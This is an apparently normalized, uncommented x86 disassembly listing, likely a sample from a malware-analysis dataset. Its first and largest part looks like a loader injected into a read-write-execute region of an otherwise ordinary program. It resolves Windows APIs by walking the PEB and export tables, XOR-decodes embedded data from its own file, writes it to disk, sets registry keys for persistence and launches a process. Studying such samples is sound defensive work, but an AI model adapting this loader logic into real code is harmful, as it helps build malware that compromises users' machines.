call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_4a227d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_4a2e90
add esp 0x4
call sub_4a3050
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_4a3080
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_4a3080
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_4a2e90
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_4a2e90
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_4a2e90
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_4a2e90
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
push 0x37b18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_4a2fc0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0x37b18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_4a2e90
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_4a2fc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge rwxdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x64
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
xor eax 0x80be78ab
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx ] al
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1 ]
cmp edx 0x7d
jne rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x77
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp eax 0x61
jne rwxdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3e4
mov [ ebp - 0x4 ] ecx
sub_4a3050
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4a3080
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_4014b0
push esi
mov esi eax
call sub_40fb00
mov eax [ esi ]
push eax
call sub_43f960
add esp 0x4
pop esi
retn
sub_402a00
mov [ ecx ] r--data
retn
sub_402ab0
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_40338f
mov eax r-xdata
retn
sub_403498
mov [ ebp - 0x4 ] 0x5
mov eax r-xdata
retn
sub_4040e3
mov [ ebp - 0x4 ] 0x2
mov eax r-xdata
retn
sub_404eb5
mov [ ebp - 0x4 ] 0xb
mov eax sub_404ec2
retn
sub_4062a0
push esi
mov esi ecx
push esi
call sub_402e30
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_4062c0
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4089d0
mov ecx [ eax + 0x4 ]
push 0x0
push 0xf020
push 0x112
push ecx
call [ SendMessageW@IAT ]
mov eax 0x1
retn
sub_40da40
push esi
mov esi ecx
push esi
call sub_40e6e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_40da60
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
retn
push eax
call sub_43f531
sub_40f010
xor eax eax
push 0xffffffff
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
push eax
mov [ esi + 0x4 ] al
mov eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_429ea0
mov eax esi
retn 0x4
sub_40f8c0
mov ecx [ eax ]
push ecx
call sub_43f960
pop ecx
retn
sub_40fc51
mov ebx [ ebp + 0x8 ]
call sub_40ffb0
push 0x0
push 0x0
call sub_442eab
int3
sub_4105a0
mov eax [ edi ]
test eax eax
je r-xdata
call sub_4407b7
cmp eax [ esi ]
je r-xdata
mov eax [ edi + 0x4 ]
xor ecx ecx
cmp eax [ esi + 0x4 ]
sete cl
mov al cl
retn
sub_4122b0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_412480
